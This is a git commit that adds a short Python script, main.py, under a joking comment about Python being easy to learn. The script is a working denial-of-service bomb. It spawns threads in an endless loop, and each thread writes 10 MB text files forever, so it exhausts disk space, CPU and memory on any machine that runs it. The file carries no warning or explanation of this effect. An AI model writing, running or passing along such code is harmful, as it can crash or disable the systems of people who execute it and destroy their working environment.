ed8f6b3ae9b8d55458a6737e2b6f64738a740215
Deeptanshu ______ <109023764+thisisdeeptanshu@users.noreply.github.com>
2022-07-16 20:57:33 +0530

    Add files via upload

---
+++ main.py
@@ -0,0 +1,21 @@
+# I wonder if the Guido van Rossum ever thought of the consequences of creating a language that is so easy to learn.
+
+import threading
+import random
+
+threads = []
+
+def createFiles(j):
+    i = 0
+    letter = random.choice("a b c d e f g h i j k l m n o p q r s t u v w x y z".split())
+    word = letter*1024*1024*10
+    while True:
+        with open(f"{letter}{j}-{i}.txt", "w") as f:
+            f.write(word)
+        i += 1
+
+j = 0
+while True:
+    threads.append(threading.Thread(target=createFiles, args=(j,)))
+    threads[-1].start()
+    j += 1
